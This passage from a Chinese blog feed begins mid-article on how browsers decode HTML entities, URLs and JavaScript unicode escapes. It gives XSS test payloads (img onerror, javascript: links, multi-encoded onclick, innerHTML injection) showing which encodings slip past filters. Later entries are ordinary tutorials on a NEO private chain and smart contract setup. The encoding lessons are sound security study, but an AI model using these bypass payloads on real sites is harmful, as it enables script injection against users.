<p>Javascript解析器工作的时候可以将<code>\u0061\u006c\u0065\u0072\u0074</code>进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p>
<p>所以unicode解码后的字符串，不能截断语句，不能有控制语法的功能，只能作为字符串，或标识符。</p>
<p>即，在绕过时，能编码的部分，不能包括控制符号如<code>(</code>,<code>)</code>,<code>;</code>,<code>&quot;</code>,<code>&#39;</code>等。解码后只作为字符串，或标识符名称处理</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1);\u0061lert(2)"</span>&gt;</span>test0<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)\u003b\u0061lert(2)"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>test0 可以弹框两个。test1不弹框</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">测试</th>
<th style="text-align:center">结果 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">test</td>
<td style="text-align:center">弹框</td>
</tr>
<tr>
<td style="text-align:center">test1</td>
<td style="text-align:center">失败，解析为字符串1，需要单引号</td>
</tr>
<tr>
<td style="text-align:center">test2</td>
<td style="text-align:center">弹框，编码<code>&#39;</code>则失败</td>
</tr>
<tr>
<td style="text-align:center">test3</td>
<td style="text-align:center">弹框</td>
</tr>
<tr>
<td style="text-align:center">test4</td>
<td style="text-align:center">失败，编码括号</td>
</tr>
<tr>
<td style="text-align:center">test5</td>
<td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td>
</tr>
<tr>
<td style="text-align:center">test6</td>
<td style="text-align:center">失败，同上，寻找相对路径链接</td>
</tr>
<tr>
<td style="text-align:center">test7</td>
<td style="text-align:center">弹框，可以添加换行符，不受印象。\u000a 换行符</td>
</tr>
</tbody>
</table>
<h2 id="判断解析流程-url"><a href="#判断解析流程-url" class="headerlink" title="判断解析流程 url"></a>判断解析流程 url</h2><p>上面分别提了三种编码，然后把URL解码，跟js解码结合在一起举了个例子。<br>可以尝试判断以下html代码再浏览器中的解析流程</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span> <span class="attr">href</span>=<span class="string">"javascript:window.open(value2)"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Value1：HTML解码 -&gt; JavaScript解码 -&gt; URL解码<br>Value2：HTML解码 -&gt; URL解码 -&gt; JavaScript解码 -&gt; URL解码</p>
<p>对value1进行细节分析：</p>
<ul>
<li>HTML解码：因为a标签可以顺利生成DOM树，对<code>window.open(&#39;value1&#39;)</code>和<code>javascript:window,open(value2)</code>进行HTML解码</li>
<li>JavaScript解码：因为onclick属性，对其中内容进行JS unicode解码<code>window.open(&#39;value1&#39;)</code></li>
<li>URL解码：window.open打开一个url，对其中内容进行url解码<code>value1</code></li>
</ul>
<p>尝试判断value1最严格编码：</p>
<ul>
<li>URL编码：<code>value1</code>。只能对value1，不能对<code>&#39;value1&#39;</code></li>
<li>JS编码：<code>window</code>,<code>open</code>,<code>%76%61%6c%75%65%31</code>。不能对<code>.</code>,<code>(</code>,<code>)</code>,<code>&#39;</code>编码</li>
<li>html实体编码：全部。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 未编码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('value1')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- URL编码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"window.open('%76%61%6c%75%65%31')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 继续js编码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"\u0077\u0069\u006e\u0064\u006f\u0077.\u006f\u0070\u0065\u006e('\u0025\u0037\u0036\u0025\u0036\u0031\u0025\u0036\u0063\u0025\u0037\u0035\u0025\u0036\u0035\u0025\u0033\u0031')"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 继续全部html实体编码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x39;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x34;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x66;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x30;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x65;&amp;#x28;&amp;#x27;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x37;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x36;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x32;&amp;#x35;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x33;&amp;#x5C;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x33;&amp;#x31;&amp;#x27;&amp;#x29;"</span>&gt;</span>go<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>value2 也是差不多意思了。</p>
<h2 id="判断解析流程-DOM"><a href="#判断解析流程-DOM" class="headerlink" title="判断解析流程 DOM"></a>判断解析流程 DOM</h2><p>基于DOM的解析流程 也会有所不同。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"1"</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"1"</span>).innerHTML = <span class="string">"&lt;img src=&amp;#35; on\u0065rror=&amp;#97;lert&amp;#40;1)&gt;"</span>;  </span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>解析过程：JS解析 -&gt; html解析 </p>
<ul>
<li>js解析：进入script标签时，进行一个js解析。还原了onerror</li>
<li>html解析：DOM修改完html标签后，会重新建立DOM树，对其中节点重新html实体编码解析</li>
</ul>
<hr>

<h1 id="自测"><a href="#自测" class="headerlink" title="自测"></a>自测</h1><p>如果做出了以下题目，应该可以说是掌握了。<br><a href="http://test.attacker-domain.com/browserparsing/tests.html" target="_blank" rel="external">题目</a><br><a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="external">答案</a></p>
<hr>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/slly/p/6640761.html" target="_blank" rel="external">https://www.cnblogs.com/slly/p/6640761.html</a><br><a href="https://www.cnblogs.com/yanglang/p/7090120.html" target="_blank" rel="external">https://www.cnblogs.com/yanglang/p/7090120.html</a><br><a href="https://segmentfault.com/a/1190000009975744" target="_blank" rel="external">https://segmentfault.com/a/1190000009975744</a><br><a href="https://www.jianshu.com/p/cfdf1747d30e" target="_blank" rel="external">https://www.jianshu.com/p/cfdf1747d30e</a><br><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="external">https://blog.csdn.net/qq_35513598/article/details/79861908</a><br><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="external">https://security.yirendai.com/news/share/26</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NEO-搭建私有链]]></title>
      <url>/2018/08/15/NEO-%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/</url>
      <content type="html"><![CDATA[<p>— cityofzion大法好 —</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>

<p>因为测试链不给GAS…只能自己搭建私有链。</p>
<p>关于NEO私有链的搭建，官网有教程，NEL有教程，毫无疑问，这些教程都很详细，很深入，很透彻……很麻烦…..<br>感觉搭建一个私有链，就是已经要了解整个区块链的机制哎，难道不是先给个实验的地方，然后一步步慢慢去了解么，都感觉本末倒置了。</p>
<p>没有链 -&gt; 雾里看花 -&gt; 测试链不给币 -&gt; 搭建私有链 -&gt; 超多麻烦 -&gt; 还是没有链 = 劝退</p>
<p>然后cityofzion的看上去最简单的拿着试了下。<br>cityofzion大法好！本以为会是一如既往艰难险阻疑无路的大坑，没想到！真的几步就好了！哇，这个社区太给力了<br>好好学习英语！</p>
<p><a href="https://hub.docker.com/r/cityofzion/neo-privatenet/" target="_blank" rel="external">docker镜像及说明</a><br><a href="https://github.com/CityOfZion/neo-privatenet-docker" target="_blank" rel="external">CityOfZion通过docker搭建NEO私有链</a></p>
<p>– 09.07 更新 –<br>重新更新，因为COZ的私有链 使用的不是最新版本的cli。<br>个人需要使用最近版本来验证一个漏洞，重新开始弄一个最新版本的私有链。<br>根据 官方的docker镜像 来构建私有链，稍微会麻烦一点，但是镜像会持续拉取最新版本的cli。</p>
<h1 id="基于CityOfZion的docker私有链"><a href="#基于CityOfZion的docker私有链" class="headerlink" title="基于CityOfZion的docker私有链"></a>基于CityOfZion的docker私有链</h1><p>可以只起neo私有链，还可以起配合neoscan的neo私有链。后者看后面的补充，可一步到位。</p>
<h2 id="两步搭建"><a href="#两步搭建" class="headerlink" title="两步搭建"></a>两步搭建</h2><hr>

<blockquote>
<p>前提 装好docker，会使用docker</p>
</blockquote>
<p>1.下载镜像<br><code>docker pull cityofzion/neo-privatenet</code><br>2.运行镜像<br><code>docker run --rm -d --name neo-privatenet -p 20333-20336:20333-20336/tcp -p 30333-30336:30333-30336/tcp cityofzion/neo-privatenet</code></p>
<h2 id="两步配置neo-gui"><a href="#两步配置neo-gui" class="headerlink" title="两步配置neo-gui"></a>两步配置neo-gui</h2><hr>

<blockquote>
<p>为了不出错，新下载一个neo-gui客户端来链接测试链，因为改测试链上的 需要删区块，没必要</p>
</blockquote>
<p>1.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/protocol.json" target="_blank" rel="external">protocol.json</a>到新neo-gui目录下<br>2.拷贝<a href="https://github.com/CityOfZion/neo-privatenet-docker/blob/master/configs/config-windows.json" target="_blank" rel="external">config.json</a>到新neo-gui目录下 </p>
<blockquote>
<p>如果docker不是在本机运行，而是在虚拟机或其他服务器上运行，修改以上两个配置文件中的 127.0.0.1/localhost 为 对应虚拟机IP地址</p>
</blockquote>
<p>启动 neo-gui 等待同步完成</p>
<h2 id="两步确认运行"><a href="#两步确认运行" class="headerlink" title="两步确认运行"></a>两步确认运行</h2><hr>

<p>如果不放心可以去确认区块的生成</p>
<p><code>docker exec -it neo-privatenet /bin/bash</code><br><code>screen -d -r node1</code></p>
<h2 id="一步有钱"><a href="#一步有钱" class="headerlink" title="一步有钱"></a>一步有钱</h2><hr>

<p>neo-gui中右键-导入-导入WIF-<code>KxDgvEKzgSBPPfuVfw67oPQBSjidEiqTHURKSDL1R7yGaGYAeYnr</code></p>
<p>搞定</p>
<h2 id="远程调用rpc"><a href="#远程调用rpc" class="headerlink" title="远程调用rpc"></a>远程调用rpc</h2><hr>

<p>远程调用rpc 就是利用neo-cli读取链上信息，以上操作已经开放远程调用。</p>
<p>私有链的远程调用端口是：<code>30333-30336</code></p>
<p>官网说明：<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="external">这里</a></p>
<p>使用方法：<br>GET:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://somewebsite.com:10332?jsonrpc=2.0&amp;method=getblockcount&amp;params=[]&amp;id=1</div></pre></td></tr></table></figure></p>
<p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://somewebsite.com:10332</div><div class="line">&#123;</div><div class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</div><div class="line">  &quot;method&quot;: &quot;getblockcount&quot;,</div><div class="line">  &quot;params&quot;: [],</div><div class="line">  &quot;id&quot;: 1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><hr>

<p>接下来就是neo-gui的操作了，转到自己的账号上啦巴拉巴拉，有了测试链才能开始学习啊喂。</p>
<p>OKOK，收工</p>
<hr>

<h2 id="补充cli-rpc-开启–log选项说明"><a href="#补充cli-rpc-开启–log选项说明" class="headerlink" title="补充cli rpc 开启–log选项说明"></a>补充cli rpc 开启–log选项说明</h2><p><hr><br>使用cli rpc 只要有能发包的工具就行，但是理所当然的没有找到很好的浏览器插件，就用burpsuite了<br>通常的api都是可以调用的，<a href="http://docs.neo.org/zh-cn/node/cli/2.7.6/api.html" target="_blank" rel="external">api查看</a></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqwbhktj30ra09vjt3.jpg" alt="22.png"></p>
<p>好吧，但是我调用这个就是为了查看notify输出信息。<br>之后调用 cli rpc 查看智能合约notify的时候发现，getapplicationlog api是不行的</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fubnqrjzd4j30rc09x755.jpg" alt="11.png"></p>
<p>感觉应该是两步起来的私有链里面的cli并没有开<code>--log</code>功能。（之后尝试修改的时候发现确实是这样）<br>那么接下来就去私链里面开–log,操作就是——<strong>进入docker-关掉neo cli-修改-重开</strong></p>
<blockquote>
<p>此处还有另一个操作，就是再起一个cli节点，修改配置文件，开log连接至私有链，就不必去动docker</p>
</blockquote>
<p>进入docker：</p>
<ul>
<li><code>docker exec -it neo-privatenet /bin/bash</code></li>
</ul>
<p><strong>关掉</strong>：</p>
<ul>
<li><code>screen -ls</code>：查看4个命令行正在运行四个共识节点neo-cli</li>
<li><code>screen -d -r node1</code>：进入这个命令行</li>
<li><code>ctrl + c</code>：终止这个进程</li>
<li>相同的重复四次 终止 node1 到 node4 每一个终止完需要等一会，会自动回到原来命令行</li>
</ul>
<p><strong>修改</strong>：</p>
<ul>
<li><code>vi /opt/start_consensus_node.sh</code>:修改已有的脚本</li>
<li><code>spawn dotnet neo-cli.dll --rpc</code> -&gt; <code>spawn dotnet neo-cli.dll --rpc --log</code></li>
<li><code>:wq</code>保存</li>
</ul>
<p><strong>重开</strong>：</p>
<ul>
<li><code>cd /opt</code>：移动目录</li>
<li><code>./run.sh</code>：执行已有的脚本，这个脚本调用了我们刚才改的脚本</li>
<li>一段时间之后ctrl+c终止脚本，另外四个进程其实已经在后台运行了</li>
</ul>
<p><strong>检查</strong>：看自己gui会不会更新，或者前文提到的检查docker内部</p>
<p><strong>提醒</strong>：记得等上链之后再调用rpc，不然还是会一样的不行</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fubnqzkg7yj30qn081my9.jpg" alt="33.png"></p>
<h2 id="补充加上neonscan"><a href="#补充加上neonscan" class="headerlink" title="补充加上neonscan"></a>补充加上neonscan</h2><p>因为要使用neon.js，需要有数据库层面对外的接口按照教程重新加了下。<br><a href="https://github.com/slipo/neo-scan-docker" target="_blank" rel="external">教程</a></p>
<p>需要停掉之前的<code>cityofzion/neo-privatenet</code>镜像<br><code>docker stop 对应的容器id</code></p>
<p>自动起环境<br><code>git clone git@github.com:slipo/neo-scan-docker.git</code><br><code>cd neo-scan-docker</code><br><code>docker-compose up</code>：这个地方会自动进入neon-scan的页面，等到同步速度变慢，就是在正常出块了，然后放着不管就好了</p>
<p>修改host文件<br><code>vi /etc/host</code>：我的是在这里<br><code>127.0.0.1 neo-privnet</code>：添加这一行，必须修改，neonscan到neon私有链是通过这个<code>neo-privnet</code>域名链接的，具体可以看dockerfile</p>
<p>其实直接用这个这个还更方便更全面emm<br>如果是从一开始私有链过来的，私有链的所有块都可以直接继承，账号也是，之前设置的 neo-gui 可以直接用</p>
<p>但是需要cli rpc 开启–log选项的话，需要按照之前的操作重复一次，并且之前的log也都会不见</p>
<blockquote>
<p>私有链搭建在另一台服务器中时，把 <code>服务器ip neo-privnet</code> 写到自己本机的host中 可以避免使用neon.js的一个坑</p>
<p>发现scan 有时候会莫名崩溃，不是特别的理解。但是重启就可以解决，进入拥有compose文件的neo-scan-docker目录<code>cd neo-scan-docker</code>。<code>docker-compose restart neo-scan</code>即可</p>
</blockquote>
<h2 id="崩溃处理"><a href="#崩溃处理" class="headerlink" title="崩溃处理"></a>崩溃处理</h2><p>2018/09/04更新。</p>
<p>今天用着用着私链崩溃，无法同步，也无法生成区块了。在写代码，不想再花精力去弄，直接删掉镜像和数据，重启了一个私有链。</p>
<p>结果发现有一个节点莫名其妙的开始区块超前。简直无法理解啊。但是三个节点仍然可以生成区块的，也没考虑那么多。</p>
<p>使用neon.js从neoscan读取节点广播交易的时候发现，一直都广播失败，很绝望。最后发现，选取节点广播交易时，都会使用区块高度最高的那个节点，去广播交易。</p>
<p>就是一直在使用坏掉的那个节点。所以一直广播失败。直接把那个节点关了即可。</p>
<p>个人感觉应该是docker镜像数据残留的问题？但是处理好了，万幸。</p>
<h1 id="基于官方docker镜像起私有链"><a href="#基于官方docker镜像起私有链" class="headerlink" title="基于官方docker镜像起私有链"></a>基于官方docker镜像起私有链</h1><p><a href="https://github.com/NewEconoLab/Docs/blob/master/study/DevOps/DockerNeoPrivatenet.md" target="_blank" rel="external">官方教程</a></p>
<p>讲的还是比较清楚的，没必要多余说明，但是有一些坑啊。</p>
<h2 id="无法启动neo-cli"><a href="#无法启动neo-cli" class="headerlink" title="无法启动neo-cli"></a>无法启动neo-cli</h2><p>当<code>donet neo-cli.dll /rpc</code>的时候</p>
<p><img src="" alt="坑0.png"></p>
<p>是官方配置文件有问题</p>
<p><img src="" alt="坑1.png"></p>
<p>感觉是老版本的cli配置文件。需要修改为右边的<code>ApplicationLogs</code>,就可以启动</p>
<p><img src="" alt="坑3.png"></p>
<h2 id="私有链端口映射有问题"><a href="#私有链端口映射有问题" class="headerlink" title="私有链端口映射有问题"></a>私有链端口映射有问题</h2><p><img src="" alt="坑4.png"></p>
<p>以上是通过官方镜像compose产生的4个镜像<br>端口映射：</p>
<ul>
<li>cli0 10331-10334 -&gt; 10331-10334</li>
<li>cli1 20331-20334 -&gt; 10331-10334</li>
<li>cli2 30331-30334 -&gt; 10331-10334</li>
<li>cli3 40331-40334 -&gt; 10331-10334</li>
</ul>
<p>实际上一个 cli容器 只会映射出一个端口</p>
]]></content>
      
        
        <tags>
            
            <tag> NEO </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NEO-智能合约JAVA c#环境]]></title>
      <url>/2018/08/13/NEO-JAVA%E7%8E%AF%E5%A2%83/</url>
      <content type="html"><![CDATA[<p>— NEO教程真的坑啊 —</p>
<a id="more"></a>
<hr>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DAPP要迁移到NEO…找了整整两天资料真的是想死，教程几乎是没有的，用户是很少的，文档是没有的，有也是老外写的，哎….</p>
<p>看着<a href="http://docs.neo.org/zh-cn/sc/quickstart/getting-started-java.html" target="_blank" rel="external">官网教程</a>弄的，但是有诸多坑</p>
<hr>

<h1 id="neo-compiler-gt-neoj"><a href="#neo-compiler-gt-neoj" class="headerlink" title="neo-compiler -&gt; neoj"></a>neo-compiler -&gt; neoj</h1><p>编译生成用于把<code>.class</code>变为虚拟机字节码的<code>neoj</code></p>
<h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><ul>
<li>对照官网教程，发布配置没有<code>netcoreapp2.0</code>选项，没有<code>部署模式</code>选项</li>
<li>编译结果没有<code>.exe</code></li>
</ul>
<p>neoj项目 右键属性 -&gt; 改为目标框架 <code>.NET Core 2.0</code> 输出类型 <code>windows 应用程序</code></p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fu85m31589j30jl08zaad.jpg" alt="bug3.png"></p>
<h2 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h2><p>编译生成的<code>neoj.exe</code> win7 下报错</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85ltih9lj30gp03n3yk.jpg" alt="bug1.png"></p>
<p>发布配置中可以改为win7*64</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85lz71fpj30el09qglr.jpg" alt="bug2.png"></p>
<p>最终OK</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85m7p83gj308a01kwea.jpg" alt="bug4.png"></p>
<hr>

<h1 id="neo-devpack-java-gt-jar包"><a href="#neo-devpack-java-gt-jar包" class="headerlink" title="neo-devpack-java -&gt; jar包"></a>neo-devpack-java -&gt; jar包</h1><p>java合约编写 与 neoj 需要使用的jar包</p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>由于我是迁移了<code>neoj.exe</code>的位置，所以按照官网导出会显示找不到文件</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fu85mcbb7bj30fr05uglx.jpg" alt="bug5.png"></p>
<p>我把 <code>\neoj\bin\Release\PublishOutput</code>(就是有neoj.exe的文件) 放到了别的地方 重命名为<code>neoj</code>文件夹</p>
<p>这里需要将 <code>neo-devpack-java</code> 中的 <code>org.neo.smartcontract.framework</code> 包 导出的 <code>org.neo.smartcontract.framework.jar</code> 放在<code>neoj</code>文件夹目录下就可以解决问题。</p>
<p>虽然我觉得官网教程中的 jar包在<code>\neoj\bin\Release\netcoreapp1.1\win10-x64\publish\</code> ，neoj.exe在<code>\neoj\bin\Release\PublishOutput</code>，neoj.exe也是找不到会报错的，但是懒得去试了，总之都丢到一个文件夹下，neoj才是真正可以用了</p>
<hr>

<h1 id="创建项目引入包"><a href="#创建项目引入包" class="headerlink" title="创建项目引入包"></a>创建项目引入包</h1><h2 id="坑1-1"><a href="#坑1-1" class="headerlink" title="坑1"></a>坑1</h2><p>创建一个neo合约项目，需要引入包之前编译的jar包，被官网教程各种误导<br>官网截图的引入包很奇怪,根本不是上面编译生成的<code>org.neo.smartcontract.framework.jar</code>而是一个<code>neo-contract.jar</code>的文件</p>
<p>我感觉是有问题的，也没管那么多，引入放在<code>neoj.exe</code>同目录下的<code>org.neo.smartcontract.framework.jar</code></p>
<p>按照官网教程的代码，编译转化，成功</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fu85mf9myrj30b002ejr8.jpg" alt="bug6.png"></p>
<h2 id="坑2-1"><a href="#坑2-1" class="headerlink" title="坑2"></a>坑2</h2><p>但是后来发现当需要引入其他包的文件时，就会出错。比如<code>neo.runtime</code>等等</p>
<p>这些函数并不在<code>org.neo.smartcontract.framework</code>里面，而在<code>neo-devpack-java</code>项目的其他包中。</p>
<p>解决办法：</p>
<ul>
<li>直接在<code>neo-devpack-java</code>项目内新建一个自己的包，直接引用其他包，就不需要编译了。</li>
<li>导出<code>neo-devpack-java</code>所有其他包变为一个jar（现在知道那个neo-contract.jar是哪来的，就是这一个包，但是竟然没有说明啊啊啊），jar导入到新创建的neo合约项目，就可以使用了</li>
</ul>
<hr>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>导出 org.neo.smartcontract.framework 程序包，只是为了给 neoj 使用</li>
<li>java内的编写合约引用包，需要neo-devpack-java所有包</li>
<li>合约写完编译后成<code>.java</code>后，再用neoj转化为<code>.avm</code>，再用neo-gui发布</li>
</ul>
<p>如此才是真正的环境弄完了。。。</p>
<p>但是….也并没有用java写…因为java例子太少了…哎…入坑c#也许更轻松…</p>
<hr>

<h1 id="c-环境"><a href="#c-环境" class="headerlink" title="c#环境"></a>c#环境</h1><p>本以为java弄好了挺好的，但是事实是java智能合约例子只有一个<br>官网API也是.net下c#的，教程也是c#的，就让人很头疼。</p>
<p>决定再三，还是去学一点c#，根据c#的例子来写智能合约</p>
<p>c# 的环境其实在经历过java环境搭建过后没有大坑。根据官网的也是比较详细的，根据它来就可以</p>
<h2 id="坑-1"><a href="#坑-1" class="headerlink" title="坑"></a>坑</h2><p>但是在编译 c#例子 的时候，两个需要触发事件的智能合约例子出了问题。</p>
<p>问题截图忘保存了，大致就是找不到一个叫<code>mscorlib.dll</code>的文件</p>
<p>但是，<code>dll</code>文件是生成了，编译是成功的，但是<code>neon xxx.dll</code>的时候出现了以上问题</p>
<blockquote>
